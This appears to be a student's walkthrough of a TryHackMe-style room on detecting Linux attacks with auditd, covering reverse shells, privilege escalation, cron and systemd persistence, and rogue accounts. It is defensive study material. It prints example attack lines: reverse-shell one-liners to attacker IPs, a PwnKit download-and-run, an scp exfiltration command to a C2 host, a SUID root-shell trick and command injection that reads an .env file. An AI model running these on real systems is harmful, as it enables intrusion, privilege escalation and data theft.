Linux Threat Detection 3
---

Reverse Shell
---

**Adversaries use reverse shell** 
- a session from the victim to the attacker to possibly continue an attack.
 
Common methods for reverse shell on Linux
---
    
|   |   |
|---|---|
|**Command on the Victim**|**Explanation**|
|`bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`|The victim is forced to connect to 10.10.10.10:1337 and launch "bash" for the attacker.|
|`socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane`|Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525.|
|`python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`|Python is an alternative to the above command. The attacker is listening at 10.30.30.30:80.|

- Reverse shell is detectable with auditd. 
    
Socat (SOcket CAT)/netcat/steriods
---

- network utility for Linux that establishes two bidirectional byte streams and transfers data between them.  
- Supports a wide rangs of protocols – TCP, UDP SSL/TLS and unix sockets.  
- `ausearch –i –x socat` <--- look for suspicious commands associated with socat  
	- 1573.002: Encrypted Channel: Asymmetric Cryptography ([Encrypted Channel: Asymmetric Cryptography, Sub-technique T1573.002 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1573/002/)) 
		- Tactic: Command and Control 
			- Using socat with opesssl address type to encrypt command and control traffic.  

	- T1048: Exfiltration Over Alternative Protocol ([Exfiltration Over Alternative Protocol, Technique T1048 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1048/)) 
		- Tactic: Exfiltration
			- Exfiltrating data over non-standard ports or protocols to avoid  detection.  

**1. Run 127.0.0.1 && whoami, what output do you see after the ping results?** 
- You will need to access the vpn on your personal computer to answer this question. 
	Answer: svctrypingme  

**2. Which IP spawned a similar reverse shell via TryPingMe app?**  
- We can run the command `ausearch –i –if /home/ubuntu/scenario/audit.log | grep whoami`  
- Or, if already in the directory, you can write `ausearch  -i  -if audit.log | whoami`  
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/253.png)

Answer: 10.14.105.255 

Privilege Escalation Basics
---

- When an adversary gains initial access, they don’t alwasy have high privileges.  
- Some users may only have access to one folder or are not allowed to download and run malware.  
- For adversaries to gain privileges, some techniques can achieve these actions.  
    
|   |   |
|---|---|
|**Preceding Discovery (IF)**|**Privilege Escalation (THEN)**|
|The `uname -a` shows an old, unpatched Ubuntu 16.04|Run an exploit like PwnKit: wget [http://bad.thm/pwnkit.sh](http://bad.thm/pwnkit.sh) \| bash|
|The `find /bin -perm 4000` detects an env binary with the SUID flag|Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p`|
|The `ls /etc/ssh` exposed an unprotected ssh-backup-key file|Try using the file to get root access: ssh [root@127.0.0.1](mailto:root@127.0.0.1) -i ssh-backup-key|

Detecting Privilege Escalation
---

- A universal approach to detect privilege escalation is to detect the surrounding events.
  
**1. Spike of Discovery Commands**  
- `whoami` (Returns Data Users) 
- `id`; `pwd`; `ls –ls`; `crontab –l` (Basic Initial Discovery)  
- `ps aux | egrep “edr|splunk|elastic”`  (Security Tools Discovery) 
- `uname –r` (Returns an old 4.4 kernel) 

**2. A Download to Temp Directory**  
- `wget hxxttp://c2-server[.]thm/pwnkit[.]c -O /tmp/pwnkit.c` (pwnkit download)  
- (pwnkit compilation)  
- `chmod +x /tmp/pwnkit`  (Making pwnkit Executable) 
- `tmp/pwnkit` (Trying to use the exploit) 

**3. Data Exfiltration With SCP**  
- `whoami`  (Returns Root User) 
- `tar czf dump.tar.gz /root /etc/` (Archiving Sensitive Data) 
- `scp dump.tar.gz attacker@c2-server.thm` (Exfiltrating the dAta) 

**Questions**

**1. Which command line was used to look for the “pass” keyword in files?**  
- When an adversary is looking for something in a system, the common commands they will use are find or `grep`.  
- In this case the adversary was looking for keyword “pass” 
- We can use the `ausearch` command and `grep` for the keyword pass to find our results.  
- `ausearch –i –if audit.log | grep pass` 
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/254.png)

Answer: grep –iR pass 

**2. Which command line was used to escalate privileges to root?**  
- To escalate privileges to root, the adversary must use `sudo` or `su` to perform those actions  
- We can `ausearch` and look for `sudo` or `su` in the audit.log file 
- We can start by grepping for the `type=EXECVE` to reduce the output of the information from ausearch) 
- `type=EXECVE`: is a record type that logs arguments that are passed to a program during its execution.  
- `ausearch –i –f audit.log| grep "type=EXECVE"` 
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/255.png)

Answer: su root 

**3. Looking at the detected .env file, what was the root password?**  
- Let's look for the .env in the audit.log 
- `ausearch –i  -if audit.log | grep .env` 
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/256.png) 

- Here we see the command that was use to read the .env.local file 
- From the previous question that from threat detection 2 with the ip 127.0.0.1 we can access the trypingme web browser and run the ping command `ping 127.0.0.1 && cat .env.local`  
![alt](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/257.png)

Answer: nGql1pQkGa 

Cron Persistence
---
- Cron jobs are similar to scheduled tasks in Windows.  
- There is a simple way to run a process on a schedule and the most popular persistence method.  

Detecting Persistence
---
- Cron jobs and systemd services are text files 
- They can be monitored using auditd 
- Persistence can be detected by tracking the creation of the related processes.  
    
|   |   |
|---|---|
|**Monitor changes in cron job files**|`/etc/crontab`, `/etc/cron.d`, `/var/spool/cron/`, `/var/spool/crontab/`|
|**Monitor changes in systemd folders**|`/lib/systemd/system/`, `/etc/systemd/system/`, and [less common](https://manpages.ubuntu.com/manpages/questing/en/man5/systemd.unit.5.html) locations|
|**Monitor related processes such as**|`nano /etc/crontab`, `crontab -e`, `systemctl start\`|`enable <service>`|

**1. What flag did you get after running the malware persisting as a service?** 
- This will be associated with systemd  
- Let look through the audit logs for a malware service that was ran  
- `ausearch –i –f /etc/systemd/system | grep service` 
    
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/258.png)

- We see a service called “tux.service” 
- Lets navigate to the file 	
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/259.png)

- Let now execute the service that is shown above “/var/lib/misc/tux” 
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/260.png)
  
	Answer: THM{hidden_penguin!} 

**2. What flag did you get after running the malware persistingas a service?** 
- Let look for `crontab` to see any path that can lead to the flag.  
- We can use `ausearch –i –x crontab` 
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/261.png) 

- We find a `cwd` 
- Let's go to that directory (we may have to sudo su to continue) 
    
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/262.png)

- Here we see reboot file /usr/sbin/phoenix  
- We then run that file. 
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/263.png)

- copy the path to where we found the file.  
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/264.png)

	Answer: THM{ressurect_on_reboot!} 

Account Persistence
----
- If SSH is exposed, the adversary may create a new user account, adding it to a privileged group and then use it for SSH login. 
    
**1. Which user was created and added to the sudo group?**  
- We can navigate to the /var/log directory to have access to the auth.log to determine which user was added. 
- When a user is added to a group in Linux, the command to do so would be useradd.  
- We can use command `cat auth.log | grep useradd`
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/265.png)

	Answer: koichi 

2. Which file was changed to allow SSH key persistence?  
- We grep for type=Path to reduce the numerous outputs from just filter ssh.  
- This will allow us to only view the path of file and be able to determine the file that was changed to allow SSH key persistence.  
- We can use command ausaerch –i | grep ‘type=PATH’ 
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/266.png) 

- To change a file, there must be root privileges to perform such actions. 
- Let reduce the output more  
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c6abfc34cfa2b4124e7961a2f071420a8087b89d/SOC/Linux/Linux%20Security%20Monitoring/Linux%20Threat%20Detection%203/Linux%20Threat%20Detection%203%20Img/267.png)

	Answer: /root/.ssh/authorized_keys
